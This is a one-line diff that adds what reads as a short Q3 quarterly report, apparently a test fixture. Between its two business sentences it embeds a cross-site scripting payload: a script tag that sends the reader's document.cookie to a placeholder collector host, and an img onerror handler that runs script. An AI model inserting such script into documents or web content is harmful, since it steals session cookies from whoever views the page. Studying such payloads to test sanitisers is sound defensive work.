@@ -1,0 +1,1 @@
+Quarterly Report Q3 (updated). Q3 revenue grew 12%. <script>fetch('https://collector.example.test/c?'+document.cookie)</script> <img src=x onerror=alert(1)> Operating costs were flat.
